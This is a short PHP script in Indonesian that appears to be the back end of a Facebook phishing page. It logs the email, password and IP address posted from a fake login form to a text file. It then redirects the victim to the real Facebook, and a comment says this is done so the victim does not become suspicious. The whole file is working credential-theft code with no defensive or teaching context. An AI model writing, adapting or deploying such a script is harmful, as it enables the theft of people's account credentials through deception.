<?php
$file = "hasil.txt";
$email = $_POST['email'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];

$data = "[IP: $ip] Email: $email | Pass: $pass\n";
file_put_contents($file, $data, FILE_APPEND);

// Redirect ke FB asli biar korban gak curiga
header("Location: https://facebook.com");
exit();
?>
